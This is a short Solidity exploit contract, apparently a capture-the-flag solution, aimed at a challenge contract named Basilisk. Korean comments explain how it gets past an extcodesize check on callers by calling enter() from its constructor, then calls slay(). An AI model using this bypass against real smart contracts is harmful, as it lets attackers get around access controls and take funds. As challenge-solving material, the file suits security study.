// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./interfaces/IChallenger.sol";
import "./Basilisk.sol";

contract Attacker is IChallenger {

    Basilisk public basilisk;

    /// @notice Called by Basilisk. Should return true.
    constructor(address _basilisk) {
        basilisk = Basilisk(_basilisk);
        // 생성자 내에서 enter() 호출 → extcodesize(this) == 0 이므로 통과
        basilisk.enter();
    }

    /// @notice Basilisk.slay() 호출 시 IChallenger 인터페이스로 사용되며, true 리턴
    function challenge() external pure override returns (bool) {
        return true;
    }

    /// @notice 생성자 이후(또는 필요할 때) slay()를 호출하는 함수
    function attack() external {
        // slay() 내부에서 entered[msg.sender] == true 이므로 실행
        basilisk.slay();
    }
}